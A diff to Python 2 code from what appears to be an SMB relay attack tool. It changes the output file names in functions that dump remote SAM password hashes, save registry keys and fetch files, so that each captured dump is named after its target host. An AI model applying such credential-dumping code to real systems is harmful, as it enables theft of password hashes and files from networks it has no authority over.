@@ -1126,14 +1126,14 @@ def DumpHashes(data, s, Host):
            data         = ModifySMBRetCode(data)
 
        #After everything has been cleaned up, we write to file and call creddump
-       WriteOutputToFile(Output, "./Sam.tmp")
+       WriteOutputToFile(Output, "./Sam-"+Host[0]+".tmp")
        try:
-           Hashes = dump_file_hashes(BootKey, SaveSam_Path+"/Sam.tmp")
-           WriteOutputToFile(Hashes, "./Hash-Dumped.txt")
+           Hashes = dump_file_hashes(BootKey, SaveSam_Path+"./Sam-"+Host[0]+".tmp")
+           WriteOutputToFile(Hashes, "./Hash-Dump-"+Host[0]+".txt")
        except:
            print "[+] Live dump failed, is python-crypto installed? "
            pass
-       print "[+] The SAM file was saved in: ./relay-dumps/Sam.tmp and the hashes in ./relay-dumps/Hash-Dumped.txt"
+       print "[+] The SAM file was saved in: ./relay-dumps/Sam-"+Host[0]+".tmp and the hashes in ./relay-dumps/Hash-Dumped-"+Host[0]+".txt"
        return data
 
     except:
@@ -1191,8 +1191,8 @@ def SaveAKey(data, s, Host, Key):
            data         = ModifySMBRetCode(data)
 
        #After everything has been cleaned up, we write the output to a file.
-       WriteOutputToFile(Output, Key+".tmp")
-       print "[+] The "+Key+" key and its subkeys were saved in: ./relay-dumps/"+Key+".tmp"
+       WriteOutputToFile(Output, Host[0]+"-"+Key+".tmp")
+       print "[+] The "+Key+" key and its subkeys were saved in: ./relay-dumps/"+Host[0]+"-"+Key+".tmp"
        return data
 
     except:
@@ -1218,7 +1218,7 @@ def GetAfFile(data, s, File, Host):
        File = File.replace("/","\\")
        data,s,f      = SMBOpenFile(File, "C", Host[0], READ, data, s)
        data,s,Output = GrabAndRead(f, File, data, s)
-       WriteOutputToFile(Output, File)
+       WriteOutputToFile(Output, Host[0]+"-"+File)
        print "[+] Done."
        return ModifySMBRetCode(data) ##Command was successful, ret true.
 
